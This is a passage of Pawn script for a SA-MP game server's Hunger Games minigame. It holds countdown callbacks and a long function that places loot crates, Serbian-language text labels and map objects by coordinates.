	foreach(new igraci : HungerGamesIgraci)
	{
		GameTextForPlayer(igraci, "3", 1000, 3);
	}
}

public hgcount2()
{
	foreach(new igraci : HungerGamesIgraci)
	{
		GameTextForPlayer(igraci, "2", 1000, 3);
	}
}

public hgcount1()
{
	foreach(new igraci : HungerGamesIgraci)
	{
		GameTextForPlayer(igraci, "1", 1000, 3);
	}
}

public hgcountgo()
{
	foreach(new igraci : HungerGamesIgraci)
	{
		GameTextForPlayer(igraci, "IGRA POCELA!", 1000, 3);
		TogglePlayerControllable(igraci, 1);
		SetCameraBehindPlayer(igraci);
	}
}

//========================= [ FUNKCIJE ZA HUNGER ] ================================//

RandomNew(min, max) //Za random brojeve sa min i max intervalom
{    
    new rand = random(max-min)+min;    
    return rand;
}

VoidHungerKurcina()
{
	// KUTIJE
	kutijeObject[0] = CreateDynamicObject(2969, 583.04840, 7429.41992, 6.66760,   4.00000, 13.00000, -32.86000);
	kutijeObject[1] = CreateDynamicObject(2969, 563.26251, 7481.78467, 12.90977,   0.00000, 0.00000, 0.00000);
	kutijeObject[2] = CreateDynamicObject(2969, 521.76953, 7504.37207, 8.52020,   11.00000, 0.00000, 0.00000);
	kutijeObject[3] = CreateDynamicObject(2969, 574.85034, 7373.64063, 12.90386,   0.00000, 0.00000, -90.12002);
	kutijeObject[4] = CreateDynamicObject(2969, 426.75552, 7497.69092, 11.44640,   10.00000, 0.00000, 13.38000);
	kutijeObject[5] = CreateDynamicObject(2969, 480.70911, 7288.23779, 9.36310,   10.00000, 3.00000, 129.31200);
	kutijeObject[6] = CreateDynamicObject(2969, 384.96576, 7510.07031, 11.25880,   10.00000, 0.00000, 0.00000);
	kutijeObject[7] = CreateDynamicObject(2969, 347.32455, 7369.50488, 10.86900,   10.00000, 3.00000, 166.39198);
	kutijeObject[8] = CreateDynamicObject(2969, 376.23975, 7316.32324, 11.76366,   10.00000, 3.00000, 129.31203);
	kutijeObject[9] = CreateDynamicObject(2969, 528.83698, 7595.62695, 48.52790,   18.00000, 0.00000, -16.00000);
	kutijeObject[10] = CreateDynamicObject(2969, 329.49438, 7417.42773, 16.71580,   10.00000, 3.00000, 0.08000);
	kutijeObject[11] = CreateDynamicObject(2969, 605.25372, 7251.98975, 46.54920,   0.00000, 0.00000, 48.72000);
	kutijeObject[12] = CreateDynamicObject(2969, 672.38708, 7300.24658, 62.05600,   -7.00000, -10.00000, 2.00000);
	kutijeObject[13] = CreateDynamicObject(2969, 306.29230, 7520.32031, 48.19660,   20.00000, 0.00000, 17.00000);
	kutijeObject[14] = CreateDynamicObject(2969, 543.14771, 7205.82959, 50.15845,   0.00000, 0.00000, 0.00000);
	kutijeObject[15] = CreateDynamicObject(2969, 328.10349, 7560.86621, 45.17260,   15.00000, 0.00000, 53.00000);
	kutijeObject[16] = CreateDynamicObject(2969, 275.06369, 7453.48291, 44.84110,   11.00000, 0.00000, 69.48000);
	kutijeObject[17] = CreateDynamicObject(2969, 467.03610, 7657.81396, 42.70420,   -19.00000, 0.00000, -69.41999);
	kutijeObject[18] = CreateDynamicObject(2969, 409.76300, 7658.84082, 68.01340,   0.00000, 0.00000, 0.00000);
	kutijeObject[19] = CreateDynamicObject(2969, 371.72879, 7185.23047, 70.46090,   -19.00000, 0.00000, -2.00000);
	kutijeObject[20] = CreateDynamicObject(2969, 240.42140, 7495.49902, 75.75180,   -30.00000, 0.00000, -67.00000);
	kutijeObject[21] = CreateDynamicObject(2969, 569.55902, 7407.53906, 6.76510,   0.00000, 0.00000, 0.00000);
	kutijeObject[22] = CreateDynamicObject(2969, 534.09668, 7349.23682, 5.52830,   0.00000, 0.00000, 0.00000);
	kutijeObject[23] = CreateDynamicObject(2969, 451.31879, 7311.72217, 6.28720,   0.00000, 0.00000, 0.00000);
	kutijeObject[24] = CreateDynamicObject(2969, 500.71619, 7313.56445, 3.01710,   0.00000, 0.00000, 0.00000);
	kutijeObject[25] = CreateDynamicObject(2969, 369.02100, 7347.65723, 9.39720,   0.00000, 0.00000, 0.00000);
	kutijeObject[26] = CreateDynamicObject(2969, 378.62231, 7461.41748, 4.17590,   0.00000, 0.00000, 0.00000);
	kutijeObject[27] = CreateDynamicObject(2969, 454.12970, 7520.75439, 13.41260,   0.00000, 0.00000, 0.00000);
	//LABELI ZA KUTIJE
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 583.04840, 7429.41992, 6.66760, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 563.26251, 7481.78467, 12.90977, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 521.76953, 7504.37207, 8.52020, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 574.85034, 7373.64063, 12.90386, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 426.75552, 7497.69092, 11.44640, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 480.70911, 7288.23779, 9.36310, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 384.96576, 7510.07031, 11.25880, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 347.32455, 7369.50488, 10.86900, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 376.23975, 7316.32324, 11.76366, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 528.83698, 7595.62695, 48.52790, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 329.49438, 7417.42773, 16.71580, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 605.25372, 7251.98975, 46.54920, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 672.38708, 7300.24658, 62.05600, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 306.29230, 7520.32031, 48.19660, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 543.14771, 7205.82959, 50.15845, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 328.10349, 7560.86621, 45.17260, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 275.06369, 7453.48291, 44.84110, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 467.03610, 7657.81396, 42.70420, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 409.76300, 7658.84082, 68.01340, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 371.72879, 7185.23047, 70.46090, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 240.42140, 7495.49902, 75.75180, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 569.55902, 7407.53906, 6.76510, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 534.09668, 7349.23682, 5.52830, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 451.31879, 7311.72217, 6.28720, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 500.71619, 7313.56445, 3.01710, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 369.02100, 7347.65723, 9.39720, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 378.62231, 7461.41748, 4.17590, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("Tipka N da otvoris kutiju", 0xF81414FF, 454.12970, 7520.75439, 13.41260, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	//MEGA KUTIJE
	CreateDynamicObject(964, 470.02332, 7422.81494, 1.45670,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(964, 473.14664, 7407.60352, 1.45670,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(964, 461.53339, 7397.27539, 1.45670,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(964, 456.88779, 7394.87793, 1.49604,   0.00000, 0.00000, 0.00000);
	//MEGA KUTIJE LABELI
	CreateDynamic3DTextLabel("/megakutija", 0xF81414FF, 470.02332, 7422.81494, 1.45670, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("/megakutija", 0xF81414FF, 473.14664, 7407.60352, 1.45670, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("/megakutija", 0xF81414FF, 461.53339, 7397.27539, 1.45670, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	CreateDynamic3DTextLabel("/megakutija", 0xF81414FF, 456.88779, 7394.87793, 1.49604, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
	// MAPA
	CreateDynamicObject(13649, 507.75546, 7426.21387, 0.16000,   0.00000, 0.00000, 291.42899);
	CreateDynamicObject(13649, 500.30334, 7439.12109, 0.16000,   0.00000, 0.00000, 308.57101);
	CreateDynamicObject(13649, 511.07227, 7411.68359, 0.16000,   0.00000, 0.00000, 274.28500);
	CreateDynamicObject(3406, 488.10782, 7422.05518, -0.58560,   0.00000, 0.00000, 11.52500);
	CreateDynamicObject(3499, 481.98383, 7424.29346, 8.45808,   270.00000, 0.00000, 10.99700);
	CreateDynamicObject(9131, 482.52994, 7420.42285, 9.39556,   108.00000, 0.00000, 10.99700);
	CreateDynamicObject(3499, 481.39114, 7427.34180, 8.45808,   270.00000, 0.00000, 10.99700);
	CreateDynamicObject(9131, 483.40213, 7419.03271, 12.07833,   126.00000, 0.00000, 10.99700);
	CreateDynamicObject(3499, 480.55600, 7429.77881, 2.85910,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3499, 483.85617, 7414.62549, 8.45808,   270.00000, 0.00000, 10.99700);
	CreateDynamicObject(728, 480.36032, 7429.46436, 1.48623,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, 483.95782, 7414.38867, 9.77493,   0.00000, 0.00000, 10.99700);
	CreateDynamicObject(9131, 483.83755, 7415.12891, 10.90646,   90.00000, 0.00000, 10.99700);
	CreateDynamicObject(3406, 491.28339, 7403.52490, -0.58560,   0.00000, 0.00000, 11.52500);
	CreateDynamicObject(9131, 484.36682, 7412.55176, 9.99061,   324.53601, 0.00000, 10.99700);
	CreateDynamicObject(9131, 483.98709, 7414.38037, 11.80758,   0.00000, 0.00000, 10.99700);
	CreateDynamicObject(9131, 483.81842, 7415.30078, 12.56983,   90.00000, 0.00000, 10.99700);
	CreateDynamicObject(9131, 483.74609, 7417.27295, 14.20738,   144.00000, 0.00000, 10.99700);
	CreateDynamicObject(3458, 483.66574, 7411.34961, -1.09314,   90.00000, 0.00000, 101.46900);
	CreateDynamicObject(923, 483.52289, 7411.22949, 2.25093,   0.00000, 0.00000, 263.26099);
	CreateDynamicObject(1362, 482.53430, 7412.71729, 2.09453,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, 484.60480, 7411.29883, 9.77493,   0.00000, 0.00000, 10.99700);
	CreateDynamicObject(9131, 484.41605, 7412.23438, 11.80758,   35.46500, 0.00000, 10.99700);
	CreateDynamicObject(9131, 484.89047, 7409.93799, 9.77493,   0.00000, 0.00000, 11.00000);
	CreateDynamicObject(13649, 489.37778, 7449.25879, 0.16000,   0.00000, 0.00000, 325.71399);
	CreateDynamicObject(9131, 484.62146, 7411.29492, 11.80758,   0.00000, 0.00000, 10.99700);
	CreateDynamicObject(13649, 509.95816, 7396.82080, 0.16000,   0.00000, 0.00000, 257.14301);
	CreateDynamicObject(9131, 485.16379, 7408.51270, 9.13973,   90.00000, 0.00000, 10.99700);
	CreateDynamicObject(9131, 484.05112, 7414.53809, 15.57432,   162.00000, 0.00000, 10.99700);
	CreateDynamicObject(9131, 485.03479, 7409.20166, 10.90646,   90.00000, 0.00000, 10.99700);
	CreateDynamicObject(9131, 485.28424, 7409.12988, 12.56983,   90.00000, 0.00000, 10.99700);
	CreateDynamicObject(2973, 477.20709, 7426.01025, 1.49604,   0.00000, 0.00000, 205.52499);
	CreateDynamicObject(9131, 485.48102, 7407.84033, 11.80758,   0.00000, 0.00000, 10.99700);
	CreateDynamicObject(9131, 484.78320, 7411.72021, 16.04534,   180.00000, 0.00000, 10.99700);
	CreateDynamicObject(3499, 477.30841, 7429.06006, 8.45810,   90.00000, 0.00000, 102.38001);
	CreateDynamicObject(3499, 485.84000, 7404.45898, 8.45808,   90.00000, 0.00000, 11.00000);
	CreateDynamicObject(9131, 485.34100, 7408.42188, 15.57432,   198.00000, 0.00000, 10.99700);
	CreateDynamicObject(9131, 485.96555, 7405.97510, 14.20738,   216.00000, 0.00000, 10.99700);
	CreateDynamicObject(9131, 486.07620, 7403.99365, 12.07833,   234.00000, 0.00000, 10.99700);
	CreateDynamicObject(9131, 485.93805, 7402.97314, 9.39556,   252.00000, 0.00000, 10.99700);
	CreateDynamicObject(935, 487.21881, 7399.79395, 2.05924,   0.00000, 0.00000, 267.49500);
	CreateDynamicObject(2973, 473.91711, 7422.06592, 1.49604,   0.00000, 0.00000, 167.54495);
	CreateDynamicObject(935, 486.23993, 7399.66064, 2.05924,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2973, 478.71664, 7407.44873, 1.49604,   0.00000, 0.00000, 205.52499);
	CreateDynamicObject(2991, 480.92355, 7402.20654, 2.08801,   0.00000, 0.00000, 336.94901);
	CreateDynamicObject(2991, 480.92383, 7402.20703, 3.26690,   0.00000, 0.00000, 336.94501);
	CreateDynamicObject(2991, 480.92383, 7402.20703, 4.40291,   0.00000, 0.00000, 336.94501);
	CreateDynamicObject(3499, 487.35883, 7396.77197, 8.45808,   90.00000, 0.00000, 10.99700);
	CreateDynamicObject(3499, 487.83319, 7394.00977, 2.85910,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(728, 488.08759, 7393.69238, 1.48623,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2907, 470.14111, 7419.31738, 2.39399,   0.00000, 0.00000, 192.03000);
	CreateDynamicObject(1997, 470.08475, 7419.50342, 1.49604,   0.00000, 0.00000, 11.00000);
	CreateDynamicObject(3800, 481.11664, 7398.71436, 1.49604,   0.00000, 0.00000, 295.47198);
	CreateDynamicObject(18260, 471.65756, 7412.47461, 3.00204,   0.00000, 0.00000, 348.47400);
	CreateDynamicObject(3800, 477.13654, 7401.58252, 1.49604,   0.00000, 0.00000, 295.47198);
	CreateDynamicObject(1997, 468.63873, 7419.19629, 1.49604,   0.00000, 0.00000, 10.99700);
	CreateDynamicObject(2907, 468.64081, 7419.04980, 2.39399,   0.00000, 0.00000, 192.02499);
	CreateDynamicObject(3406, 468.55203, 7433.47217, -0.58560,   0.00000, 0.00000, -258.23517);
	CreateDynamicObject(3499, 484.83969, 7393.32715, 8.45810,   90.00000, 0.00000, 101.90002);
	CreateDynamicObject(2907, 467.27216, 7418.63818, 2.39399,   0.00000, 0.00000, 192.02499);
	CreateDynamicObject(1997, 467.16748, 7418.91797, 1.49604,   0.00000, 0.00000, 10.99700);
	CreateDynamicObject(3499, 466.93307, 7426.78564, 8.45810,   90.00000, 0.00000, -77.61999);
	CreateDynamicObject(621, 542.43658, 7450.39063, 3.79950,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3066, 474.84598, 7399.85986, 2.57912,   0.00000, 0.00000, 18.08700);
	CreateDynamicObject(930, 466.07834, 7419.31738, 1.92040,   0.00000, 0.00000, 277.95999);
	CreateDynamicObject(1337, 476.08414, 7397.29932, 0.00000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(930, 465.33096, 7419.16650, 1.92040,   0.00000, 0.00000, 277.95999);
	CreateDynamicObject(13649, 475.94952, 7455.72559, 0.16000,   0.00000, 0.00000, 342.85699);
	CreateDynamicObject(13649, 504.51303, 7382.94678, 0.16000,   0.00000, 0.00000, 240.00000);
	CreateDynamicObject(3800, 464.43729, 7415.89697, 1.49604,   0.00000, 0.00000, 295.47198);
	CreateDynamicObject(621, 533.45789, 7389.21094, 1.32182,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3630, 462.21863, 7423.75391, 2.98867,   0.00000, 0.00000, 20.93301);
	CreateDynamicObject(3761, 468.03946, 7403.78662, 3.43743,   0.00000, 0.00000, 3.84000);
	CreateDynamicObject(3458, 461.62119, 7425.92578, -1.08130,   90.00000, 0.00000, 191.40800);
	CreateDynamicObject(6959, 464.87769, 7407.73584, 1.52729,   0.00000, 0.00000, 11.52500);
	CreateDynamicObject(6959, 465.00461, 7407.26660, 1.52729,   0.00000, 0.00000, 11.52600);
	CreateDynamicObject(6959, 464.87769, 7407.73584, -1.48772,   0.00000, 0.00000, 11.52500);
	CreateDynamicObject(930, 463.09668, 7412.04785, 1.81994,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(6959, 465.11963, 7407.39893, -3.85878,   0.00000, 0.00000, 11.52500);
	CreateDynamicObject(3458, 460.64835, 7425.72607, -1.08130,   90.00000, 0.00000, 191.40401);
	CreateDynamicObject(925, 461.59039, 7412.91553, 2.55795,   0.00000, 0.00000, 274.98300);
	CreateDynamicObject(925, 461.59082, 7412.91602, 4.54484,   0.00000, 0.00000, 274.98199);
	CreateDynamicObject(3761, 468.41678, 7398.07227, 3.43743,   0.00000, 0.00000, 3.84200);
	CreateDynamicObject(3499, 474.64157, 7391.26758, 8.45810,   90.00000, 0.00000, -79.00000);
	CreateDynamicObject(2973, 461.30215, 7409.36768, 1.49604,   0.00000, 0.00000, 306.80200);
	CreateDynamicObject(3406, 479.01401, 7385.88135, -0.58560,   0.00000, 0.00000, -78.65501);
	CreateDynamicObject(3633, 471.43784, 7391.51953, 1.97085,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3633, 471.43750, 7391.51953, 2.88605,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3499, 456.57767, 7424.51025, 8.45810,   90.00000, 0.00000, -77.61999);
	CreateDynamicObject(3458, 469.10376, 7389.20166, -1.09314,   90.00000, 0.00000, 11.52500);
	CreateDynamicObject(3458, 468.17560, 7389.00732, -1.09314,   90.00000, 0.00000, 11.52600);
	CreateDynamicObject(2669, 465.85501, 7391.36963, 2.72112,   0.00000, 0.00000, 123.26800);
	CreateDynamicObject(939, 457.97131, 7403.89111, 3.80999,   0.00000, 0.00000, 10.99700);
	CreateDynamicObject(13649, 461.21191, 7457.94727, 0.16000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3630, 453.69507, 7410.78418, 2.98867,   0.00000, 0.00000, 84.35300);
	CreateDynamicObject(13649, 495.22040, 7371.29395, 0.16000,   0.00000, 0.00000, 222.85699);
	CreateDynamicObject(3499, 450.93912, 7423.29443, 8.45810,   90.00000, 0.00000, -77.61999);
	CreateDynamicObject(3499, 464.33325, 7389.28516, 8.45810,   90.00000, 0.00000, -79.00000);
	CreateDynamicObject(621, 525.13458, 7481.90723, 2.58134,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3406, 450.17444, 7429.86963, -0.58560,   0.00000, 0.00000, -258.23517);
	CreateDynamicObject(939, 452.94522, 7402.93799, 3.80999,   0.00000, 0.00000, 11.00000);
	CreateDynamicObject(3378, 450.15271, 7408.46387, 0.36963,   0.00000, 0.00000, 10.99700);
	CreateDynamicObject(18228, 497.11725, 7485.84766, -5.43975,   0.00000, 0.00000, 207.99699);
	CreateDynamicObject(3378, 452.61581, 7397.10498, 0.37923,   0.00000, 0.00000, 11.00000);
	CreateDynamicObject(18228, 570.83099, 7437.19238, 0.66025,   0.00000, 0.00000, 207.99300);
	CreateDynamicObject(3066, 453.06488, 7394.31006, 2.57912,   0.00000, 0.00000, 45.56701);
	CreateDynamicObject(3499, 444.51205, 7421.91016, 8.45810,   90.00000, 0.00000, -77.61999);
	CreateDynamicObject(3406, 461.23618, 7382.00342, -0.58560,   0.00000, 0.00000, -80.45500);
	CreateDynamicObject(9249, 554.08301, 7471.18359, -8.58579,   0.00000, 0.00000, 295.98801);
	CreateDynamicObject(728, 442.65732, 7421.41309, 1.48623,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3499, 442.25024, 7421.29053, 2.85910,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3458, 446.15378, 7403.60254, -1.08130,   90.00000, 0.00000, 281.58099);
	CreateDynamicObject(3499, 442.66293, 7418.59229, 8.45808,   270.00000, 0.00000, 10.99700);
	CreateDynamicObject(3499, 444.66324, 7408.39453, 8.45808,   270.00000, 0.00000, 10.99700);
	CreateDynamicObject(621, 543.36816, 7370.21191, 6.10909,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3499, 454.01077, 7387.26904, 8.45810,   90.00000, 0.00000, -79.00000);
	CreateDynamicObject(3499, 446.67569, 7398.06641, 8.45808,   270.00000, 0.00000, 10.99700);
	CreateDynamicObject(13649, 446.47400, 7455.72559, 0.16000,   0.00000, 0.00000, 17.14300);
	CreateDynamicObject(13649, 482.90594, 7362.89844, 0.16000,   0.00000, 0.00000, 205.71400);
	CreateDynamicObject(621, 572.74902, 7402.67188, 7.16612,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3499, 451.63824, 7386.79053, 8.45810,   90.00000, 0.00000, -79.00000);
	CreateDynamicObject(9249, 563.72003, 7385.43799, -8.83579,   0.00000, 0.00000, 215.99100);
	CreateDynamicObject(18228, 491.39688, 7494.28271, -2.52186,   0.00000, 0.00000, 300.22989);
	CreateDynamicObject(621, 555.23572, 7477.61719, 9.59937,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3499, 448.54205, 7388.60059, 8.45808,   270.00000, 0.00000, 191.29700);
	CreateDynamicObject(728, 449.84756, 7385.83447, 1.48623,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3406, 438.60422, 7411.72217, -0.58560,   0.00000, 0.00000, -168.17499);
	CreateDynamicObject(3499, 449.28131, 7386.40674, 2.85910,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3406, 442.01068, 7393.38428, -0.58560,   0.00000, 0.00000, -168.17499);
	CreateDynamicObject(13649, 433.04575, 7449.25879, 0.16000,   0.00000, 0.00000, 34.28600);
	CreateDynamicObject(13649, 468.66388, 7358.50488, 0.16000,   0.00000, 0.00000, 188.57100);
	CreateDynamicObject(621, 462.05710, 7491.31934, 4.25080,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(621, 538.17487, 7349.26611, 4.15458,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(13649, 422.12018, 7439.12109, 0.16000,   0.00000, 0.00000, 51.42900);
	CreateDynamicObject(13649, 453.75964, 7358.50488, 0.16000,   0.00000, 0.00000, 171.42900);
	CreateDynamicObject(621, 443.73685, 7485.84473, 7.53279,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(706, 584.47681, 7465.34180, -18.72191,   0.00000, 0.00000, 359.99799);
	CreateDynamicObject(621, 528.97198, 7513.50488, 9.61828,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(13649, 414.66806, 7426.21387, 0.16000,   0.00000, 0.00000, 68.57100);
	CreateDynamicObject(13649, 439.51758, 7362.89844, 0.16000,   0.00000, 0.00000, 154.28600);
	CreateDynamicObject(823, 572.51813, 7359.41309, 12.94511,   0.00000, 0.00000, 220.00000);
	CreateDynamicObject(18228, 478.60526, 7516.00830, 9.44025,   0.00000, 0.00000, 247.99300);
	CreateDynamicObject(13649, 411.35156, 7411.68359, 0.16000,   0.00000, 0.00000, 85.71400);
	CreateDynamicObject(13649, 427.20313, 7371.29395, 0.16000,   0.00000, 0.00000, 137.14301);
	CreateDynamicObject(13649, 412.46536, 7396.82080, 0.16000,   0.00000, 0.00000, 102.85700);
	CreateDynamicObject(13649, 417.91049, 7382.94678, 0.16000,   0.00000, 0.00000, 120.00000);
	CreateDynamicObject(709, 528.26337, 7331.44531, -30.42654,   0.00000, 0.00000, 279.98099);
	CreateDynamicObject(18228, 521.29486, 7324.44238, 0.66025,   0.00000, 0.00000, 135.99300);
	CreateDynamicObject(18228, 580.11078, 7348.85498, 8.19025,   0.00000, 0.00000, 219.98500);
	CreateDynamicObject(18228, 606.89398, 7386.63086, 8.19025,   0.00000, 0.00000, 217.98900);
	CreateDynamicObject(729, 578.24127, 7502.77246, 28.22642,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(729, 605.91949, 7469.09033, 34.46502,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(621, 432.07309, 7507.67383, 11.48276,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18228, 568.22388, 7327.38135, 8.19025,   0.00000, 0.00000, 203.98500);
	CreateDynamicObject(621, 469.77979, 7316.39307, 3.23292,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(767, 620.30927, 7393.97461, 8.98325,   0.00000, 0.00000, 73.99000);
	CreateDynamicObject(9249, 422.95508, 7507.15918, -5.37579,   0.00000, 0.00000, 341.98801);
	CreateDynamicObject(767, 609.64154, 7364.15332, 13.62325,   0.00000, 0.00000, 77.99600);
	CreateDynamicObject(767, 618.06464, 7379.73047, 9.98325,   0.00000, 0.00000, 87.99200);
	CreateDynamicObject(767, 602.75598, 7354.33643, 17.26325,   0.00000, 0.00000, 39.99800);
	CreateDynamicObject(18228, 467.92508, 7540.72266, 11.01025,   0.00000, 0.00000, 174.20900);
	CreateDynamicObject(823, 431.26611, 7524.06641, 16.46064,   0.00000, 0.00000, 250.00000);
	CreateDynamicObject(18228, 467.19724, 7544.86426, 11.01025,   0.00000, 0.00000, 171.98900);
	CreateDynamicObject(621, 437.01620, 7322.31299, 2.60443,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18228, 564.76501, 7313.17969, 0.66025,   0.00000, 0.00000, 135.98900);
	CreateDynamicObject(767, 599.32330, 7339.71338, 17.26325,   0.00000, 0.00000, 30.00000);
	CreateDynamicObject(621, 401.57550, 7495.89014, 7.81329,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(754, 479.40439, 7301.27539, 6.80849,   0.00000, 0.00000, 2.00000);
	CreateDynamicObject(706, 632.81213, 7459.02051, 14.35809,   0.00000, 0.00000, 74.00000);
	CreateDynamicObject(791, 612.35834, 7500.56445, 30.71809,   0.00000, 0.00000, 219.97301);
	CreateDynamicObject(9249, 458.19449, 7304.91504, -11.08579,   0.00000, 0.00000, 156.00000);
